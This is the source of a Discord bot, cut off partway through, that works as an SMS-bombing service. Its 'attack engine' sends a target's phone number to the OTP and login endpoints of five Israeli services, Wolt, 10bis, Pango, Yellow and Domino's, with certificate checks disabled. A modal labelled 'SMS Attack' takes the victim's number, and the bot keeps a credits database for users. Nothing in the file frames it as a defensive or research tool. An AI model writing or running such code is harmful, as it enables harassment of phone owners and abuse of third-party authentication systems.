import discord
from discord import app_commands
from discord.ext import commands
import os, json, httpx, asyncio, datetime
from flask import Flask
from threading import Thread

# --- Render Keep-Alive ---
app = Flask('')
@app.route('/')
def home(): return "Bot Online"
def run():
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080)))
def keep_alive():
    Thread(target=run).start()

# --- הגדרות ---
TOKEN = os.getenv("DISCORD_TOKEN")
OWNER_ROLE_NAME = "Owner"
MY_USER_ID = 1499077731659284540 
LOG_CHANNEL_ID = 1499510962296721568
DB_FILE = "database.json"

def get_data():
    if not os.path.exists(DB_FILE): return {"credits": {}, "blacklist": []}
    with open(DB_FILE, "r") as f: return json.load(f)

def save_data(data):
    with open(DB_FILE, "w") as f: json.dump(data, f, indent=4)

async def send_log(bot, title, description, color=discord.Color.blue()):
    try:
        channel = await bot.fetch_channel(LOG_CHANNEL_ID)
        embed = discord.Embed(title=title, description=description, color=color, timestamp=datetime.datetime.now())
        await channel.send(embed=embed)
    except: pass

# --- מנוע תקיפה ---
async def run_attack(phone):
    clean_p = phone[1:] if phone.startswith('0') else phone
    success, failed = 0, 0
    targets = [
        {"url": "https://api.wolt.com/v1/user/login/otp", "json": {"phone": f"+972{clean_p}"}},
        {"url": "https://www.10bis.co.il/NextApi/User/Login", "json": {"phoneNumber": phone, "isSmsAuth": True}},
        {"url": "https://pango.co.il/api/auth/login", "json": {"phone": phone}},
        {"url": "https://yellow.co.il/api/v1/auth/register-otp", "json": {"phone": phone}},
        {"url": "https://www.dominos.co.il/api/v1/auth/otp", "json": {"phone": phone}}
    ]
    headers = {"User-Agent": "Mozilla/5.0"}
    async with httpx.AsyncClient(verify=False, timeout=10.0) as client:
        for t in targets:
            try:
                resp = await client.post(t["url"], json=t["json"], headers=headers)
                if 200 <= resp.status_code < 300: success += 1
                else: failed += 1
            except: failed += 1
    return success, failed

# --- UI: פאנל ---
class AttackModal(discord.ui.Modal, title="Vouge - SMS Attack"):
    phone = discord.ui.TextInput(label="מספר טלפון", placeholder="05XXXXXXXX", min_length=10, max_length=10)
    async def on_submit(self, interaction:
